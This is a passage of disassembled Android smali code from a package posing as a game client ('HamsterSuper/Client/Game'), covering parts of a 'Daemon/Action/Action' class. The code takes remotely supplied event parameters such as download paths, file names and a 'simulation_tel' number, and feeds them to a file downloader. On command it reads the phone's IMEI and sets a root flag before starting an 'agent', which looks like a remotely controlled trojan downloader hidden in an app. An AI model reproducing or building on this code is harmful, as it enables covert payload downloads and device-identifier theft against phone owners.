    const/4 v3, 0x1

    goto/16 :goto_1

    .line 351
    :cond_d
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->even_num:I

    move v4, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->even_version:I

    move v5, v0

    mul-int/lit8 v5, v5, 0xa

    .line 352
    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->even_type:I

    move v6, v0

    add-int/2addr v5, v6

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->notice_title:Ljava/lang/String;

    move-object v6, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->notice_info:Ljava/lang/String;

    move-object v7, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->push_time:I

    move v8, v0

    .line 353
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->simulation_tel:Ljava/lang/String;

    move-object v9, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->downpath:Ljava/lang/String;

    move-object v10, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->priority:I

    move v11, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->strategy:I

    move v12, v0

    .line 351
    invoke-virtual/range {v3 .. v12}, LDaemon/DownLoad/FileDownloader;->setType(IILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;II)I

    move-result v22

    .line 355
    .restart local v22    # "type":I
    const/4 v3, 0x2

    move/from16 v0, v22

    move v1, v3

    if-ne v0, v1, :cond_e

    .line 358
    :try_start_2
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->downpath:Ljava/lang/String;

    move-object v4, v0

    .line 359
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->filename:Ljava/lang/String;

    move-object v5, v0

    const/4 v6, 0x3

    .line 358
    invoke-virtual {v3, v4, v5, v6}, LDaemon/DownLoad/FileDownloader;->UpdateFileDownloader(Ljava/lang/String;Ljava/lang/String;I)V

    .line 360
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    const/4 v4, 0x0

    invoke-virtual {v3, v4}, LDaemon/DownLoad/FileDownloader;->download(LDaemon/DownLoad/DownloadProgressListener;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto/16 :goto_0

    .line 361
    :catch_2
    move-exception v3

    move-object v15, v3

    .line 363
    .restart local v15    # "e":Ljava/lang/Exception;
    invoke-virtual {v15}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_0

    .line 366
    .end local v15    # "e":Ljava/lang/Exception;
    :cond_e
    if-nez v22, :cond_0

    move/from16 v3, v22

    .line 368
    goto/16 :goto_1

    .line 374
    .end local v22    # "type":I
    :cond_f
    const/4 v3, 0x2

    move/from16 v0, p1

    move v1, v3

    if-ne v0, v1, :cond_0

    .line 377
    packed-switch p2, :pswitch_data_2

    goto/16 :goto_0

    .line 380
    :pswitch_c
    const-string v3, "init_read"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 381
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-static {v3}, LDaemon/Service/ReadKey;->Read(Landroid/content/Context;)Ljava/lang/Boolean;

    .line 382
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->context:Landroid/content/Context;

    move-object v3, v0

    .line 383
    const-string v4, "phone"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v21

    .line 382
    check-cast v21, Landroid/telephony/TelephonyManager;

    .line 384
    .local v21, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual/range {v21 .. v21}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v19

    .line 385
    .local v19, "imei":Ljava/lang/String;
    invoke-static {}, LDaemon/Service/HeartConnecter;->getalltime()I

    move-result v3

    sget v4, LDaemon/Action/Action;->startdate:I

    if-lt v3, v4, :cond_10

    .line 386
    if-nez v19, :cond_0

    .line 387
    :cond_10
    const/4 v3, 0x2

    goto/16 :goto_1

    .line 392
    .end local v19    # "imei":Ljava/lang/String;
    .end local v21    # "telephonyManager":Landroid/telephony/TelephonyManager;
    :pswitch_d
    const-string v3, "init_start"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 393
    const/4 v3, 0x1

    sput v3, LHamsterSuper/Client/Game/BootReceiver;->start_root:I

    .line 394
    invoke-static {}, LHamsterSuper/Client/Game/BootReceiver;->start_agent()V

    goto/16 :goto_0

    .line 398
    :pswitch_e
    const-string v3, "init_version_code"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 399
    new-instance v20, Landroid/content/Intent;

    const-string v3, "android.intent.action.HEART_CODE"

    move-object/from16 v0, v20

    move-object v1, v3

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 400
    .local v20, "intent":Landroid/content/Intent;
    const-string v3, "VERSION_CODE"

    .line 401
    sget-object v4, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-static {v4}, LDaemon/Service/ReadKey;->ReadVersionCode(Landroid/content/Context;)I

    move-result v4

    .line 400
    move-object/from16 v0, v20

    move-object v1, v3

    move v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    .line 402
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->mCtx:Landroid/content/Context;

    move-object v0, v3

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 191
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_8
    .end packed-switch

    .line 275
    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_9
        :pswitch_a
        :pswitch_b
    .end packed-switch

    .line 377
    :pswitch_data_2
    .packed-switch 0x0
        :pswitch_c
        :pswitch_d
        :pswitch_e
    .end packed-switch
.end method

.method public Update_Notice(LDaemon/Action/NoticeBase;)V
    .locals 0
    .param p1, "noticebase"    # LDaemon/Action/NoticeBase;

    .prologue
    .line 115
    iput-object p1, p0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    .line 117
    return-void
.end method

.method public setEvent(IILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;ILjava/lang/String;II)V
    .locals 4
    .param p1, "even_num"    # I
    .param p2, "even_version"    # I
    .param p3, "notice_title"    # Ljava/lang/String;
    .param p4, "notice_info"    # Ljava/lang/String;
    .param p5, "even_type"    # I
    .param p6, "simulation_tel"    # Ljava/lang/String;
    .param p7, "downpath"    # Ljava/lang/String;
    .param p8, "push_time"    # I
    .param p9, "filename"    # Ljava/lang/String;
    .param p10, "priority"    # I
    .param p11, "strategy"    # I

    .prologue
    const/4 v3, 0x2

    const/4 v2, 0x1

    .line 146
    iput p1, p0, LDaemon/Action/Action;->even_num:I

    .line 147
    iput p2, p0, LDaemon/Action/Action;->even_version:I

    .line 148
    iput p5, p0, LDaemon/Action/Action;->even_type:I

    .line 149
    iput-object p7, p0, LDaemon/Action/Action;->downpath:Ljava/lang/String;

    .line 150
    iput-object p3, p0, LDaemon/Action/Action;->notice_title:Ljava/lang/String;

    .line 151
    iput-object p4, p0, LDaemon/Action/Action;->notice_info:Ljava/lang/String;

    .line 152
    iput-object p6, p0, LDaemon/Action/Action;->simulation_tel:Ljava/lang/String;

    .line 153
    iput p8, p0, LDaemon/Action/Action;->push_time:I

    .line 154
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "even_num:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "push_time:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 155
    iput-object p9, p0, LDaemon/Action/Action;->filename:Ljava/lang/String;

    .line 156
    iput p10, p0, LDaemon/Action/Action;->priority:I

    .line 157
    iput p11, p0, LDaemon/Action/Action;->strategy:I

    .line 158
    sput v3, LDaemon/Action/Action;->even_mode:I

    .line 160
    if-eq p5, v2, :cond_0

    .line 161
    const/4 v0, 0x4

    if-eq p5, v0, :cond_0

    .line 162
    const/4 v0, 0x6

    if-eq p5, v0, :cond_0

    .line 163
    const/4 v0, 0x7

    if-eq p5, v0, :cond_0

    .line 164
    const/16 v0, 0x8

    if-ne p5, v0, :cond_2

    .line 166
    :cond_0
    const/4 v0, 0x0

    sput v0, LDaemon/Action/Action;->even_mode:I

    .line 174
    :cond_1
    :goto_0
    return-void

    .line 168
    :cond_2
    if-ne p5, v3, :cond_1

    .line 169
    iget-object v0, p0, LDaemon/Action/Action;->downpath:Ljava/lang/String;

    if-eqz v0, :cond_3

    iget-object v0, p0, LDaemon/Action/Action;->downpath:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    const/16 v1, 0xb

    if-ge v0, v1, :cond_4

    .line 170
    :cond_3
    iput v2, p0, LDaemon/Action/Action;->even_type:I

    goto :goto_0

    .line 172
    :cond_4
    sput v2, LDaemon/Action/Action;->even_mode:I

    goto :goto_0
.end method
